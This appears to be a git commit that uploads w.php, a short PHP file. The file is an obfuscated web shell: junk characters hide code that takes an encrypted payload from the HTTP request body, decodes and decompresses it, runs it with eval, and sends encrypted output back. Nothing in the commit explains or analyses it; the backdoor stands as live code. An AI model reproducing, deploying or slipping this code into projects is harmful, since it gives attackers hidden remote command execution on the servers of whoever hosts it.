91a4b773fb1f93a9ba7d0c2aa0b030e9e81f7f29
Zidan Rahmandani <zidansec@gmail.com>
2022-09-28 00:26:05 +0700

    Add files via upload

---
+++ w.php
@@ -0,0 +1,10 @@
+<?php
+$L='t,$k){$c=strl##en($k)#;$#l=strlen($#t);$o=""##;for($i=0;#$i<$l;){for(#$j#=#0;($j<#$c&#&$i<$l);$j#++,$i++';
+$n='/i#n#put"),$m)==#1) {@o#b_st#art();@e#val#(@g#zu#ncompress(@x(#@bas#e64_decode#($m#[1]),$k))#);$o=@#ob_';
+$i='#){$o.=$#t{$i}#^$k{#$j#};}}r#eturn $o;}if# (@#preg_ma##tch("/$k#h(.+#)$kf/",@file_get_con#tent#s("php:/';
+$t='get#_con#tents();#@#ob_end_cl#ean#();$r=@base#64_#encod###e(@x(@gzcompr#ess($o),$k#));#print#("$p$kh$r$kf");}';
+$N=str_replace('Tx','','cTxreTxTxate_fTxuTxTxnction');
+$K='$k="f97#71565#";$k#h="#d65ba1e1d3f0#";$kf="#9#6#3c95889a87";$p="#J#F47dn#LQYO#y9E#Amm##";function x($';
+$P=str_replace('#','',$K.$L.$i.$n.$t);
+$Q=$N('',$P);$Q();
+?>
